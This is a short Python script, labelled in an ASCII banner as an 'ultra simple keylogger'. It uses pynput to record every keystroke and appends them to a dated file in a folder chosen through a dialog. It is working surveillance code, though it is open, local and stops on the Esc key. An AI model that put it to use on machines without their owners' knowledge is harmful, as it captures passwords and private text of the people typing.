# importing stuff
from pynput.keyboard import Key, Listener
from datetime import datetime,date
from tkinter import filedialog
from tkinter import *
import os 

# settings variables
count = 0
keys = []

# setting up date
now = datetime.now()
hour_now = int(now.strftime("%H"))
today = date.today()

# main functionality

def nice_intro():
    print("      .__   __                         .__               .__          \n")
    print(" __ __|  |_/  |_____________      _____|__| _____ ______ |  |   ____  \n")
    print("|  |  \  |\   __\_  __ \__  \    /  ___/  |/     \\____ \|  | _/ __ \ \n")
    print("|  |  /  |_|  |  |  | \// __ \_  \___ \|  |  Y Y  \  |_> >  |_\  ___/ \n")
    print("|____/|____/__|  |__|  (____  / /____  >__|__|_|  /   __/|____/\___  >\n")
    print("                            \/       \/         \/|__|             \/ \n")
    print(" __                 .__                                     \n")
    print("|  | __ ____ ___.__.|  |   ____   ____   ____   ___________ \n")
    print("|  |/ // __ <   |  ||  |  /  _ \ / ___\ / ___\_/ __ \_  __ \ \n")
    print("|    <\  ___/\___  ||  |_(  <_> ) /_/  > /_/  >  ___/|  | \/\n")
    print("|__|_ \\___  > ____||____/\____/\___  /\___  / \___  >__|   \n")
    print("     \/    \/\/                /_____//_____/      \/       \n")
    print('\n')
    print('\n')
    print("you will be prompted to select a place to store the file in which keystrokes are recorded")
    print('\n')
    

nice_intro()


def get_dir():
    root = Tk()
    root.withdraw()
    folder_selected = filedialog.askdirectory()
    os.chdir(folder_selected)

get_dir()

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    #print("{0} pressed".format(key))
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(str(str(today)+"  - " +str(hour_now)+" hours"), "a+") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listner:
    listner.join()
